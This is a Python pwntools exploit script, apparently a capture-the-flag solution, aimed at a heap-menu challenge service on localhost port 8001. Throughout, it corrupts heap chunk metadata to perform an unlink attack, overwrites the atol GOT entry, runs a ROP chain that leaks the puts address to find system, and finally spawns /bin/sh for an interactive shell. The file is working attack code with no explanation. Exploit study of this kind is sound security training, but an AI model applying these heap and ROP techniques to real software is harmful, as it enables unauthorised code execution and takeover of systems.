from pwn import *
import time

DEBUG = True

def wait():
  time.sleep(0.05)

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def alloc(p, size):
  wait()
  p.sendline("1")

  wait()
  p.sendline(str(size))
 
  response = r(p, "\n")
  idx = response.split("\n")[0]

  response = r(p, "\n")
  if response.find("FAIL") >= 0:
    return alloc(p, size)
  else: 
    if DEBUG:
      log.info("Alloc: " + idx)
    return int(idx)

def write(p, idx, size, text):
  wait()
  p.sendline("2")

  wait()
  p.sendline(str(idx))

  wait()
  p.sendline(str(size))

  wait()
  p.send(text)

  response = r(p, "\n")

  if response.find("FAIL") >= 0:
    write(p, idx, size, text)
  elif DEBUG:
    log.info("Write done")


def dealloc(p, idx):
  wait()
  p.sendline("3")

  wait()
  p.sendline(str(idx))

  response = r(p, "\n")

  if response.find("FAIL") >= 0:
    dealloc(p, idx)
  elif DEBUG:
    log.info("Dealloc done")

malloc_size = 0x80
header_size = 0x10

ptr_addr = 0x602150
buf1_addr = 0x606060
buf2_addr = 0x707070

atol_got = 0x602080

puts_offset = 0x6fd60
system_offset = 0x46590

p = remote("localhost", 8001)

# Step 1: Make ptr to point ptr - 0x18

alloc(p, malloc_size)
alloc(p, malloc_size)
alloc(p, malloc_size)

payload = p64(malloc_size)          # prev_size
payload += p64(malloc_size | 1)     # size + flag
payload += p64(ptr_addr - 0x18)     # fd
payload += p64(ptr_addr - 0x10)     # bk
payload += "A" * (malloc_size - len(payload)) # Dummy
payload += p64(malloc_size)         # prev_size
payload += p64((malloc_size + header_size) & ~1) # size + flag

write(p, 2, len(payload), payload)

dealloc(p, 3)


# Step 2: Setting for ROP

# Gadgets for ROP
pppret = 0x400dbe
stack_pivoting = 0x400dbd   # pop rsp; pppret;
prdi_ret = 0x400dc3
prbp_ret = 0x4008a0

puts_plt = 0x400760
puts_got = 0x602020
fgets_stdin = 0x400b1e      # After fgets, pppret(atol) called
fflush_plt = 0x400810

rop_chain = ptr_addr + 0x8

stack_setting = p64(stack_pivoting)
stack_setting += p64(rop_chain)

# Pointer overwrite
ptr_overwrite = "A" * 0x18
ptr_overwrite += p64(atol_got)

# ROP Chain
ptr_overwrite += "A" * 0x18 # for pop * 3

ptr_overwrite += p64(prdi_ret)
ptr_overwrite += p64(puts_got)
ptr_overwrite += p64(puts_plt)

ptr_overwrite += p64(prdi_ret)
ptr_overwrite += p64(0x0)
ptr_overwrite += p64(fflush_plt)

ptr_overwrite += p64(prbp_ret)
ptr_overwrite += p64(buf2_addr + 0x70 - 1)
ptr_overwrite += p64(fgets_stdin)

ptr_overwrite += "A" * 0x10

ptr_overwrite += p64(prbp_ret)
ptr_overwrite += p64(buf1_addr + 0x70)
ptr_overwrite += p64(fgets_stdin)

ptr_overwrite += "A" * 0x10

ptr_overwrite += p64(prdi_ret)
ptr_overwrite += p64(buf2_addr)

ptr_overwrite += p64(stack_pivoting)
ptr_overwrite += p64(buf1_addr - 0x18)

# Step 3: Overwrite GOT and do ROP !

write(p, 2, len(ptr_overwrite), ptr_overwrite)
write(p, 2, 0x8, p64(pppret))

p.sendline("3")

wait()
p.send(stack_setting)

response = p.recvline()
puts_leak = u64(response[:-1] + "\x00" * (8 - len(response) + 1))

system_addr = puts_leak - puts_offset + system_offset

log.info("puts: %x" % puts_leak)
log.info("system: %x" % system_addr)

wait()
p.sendline("/bin/sh\0")

wait()
p.sendline(p64(system_addr))

p.interactive()

p.close()
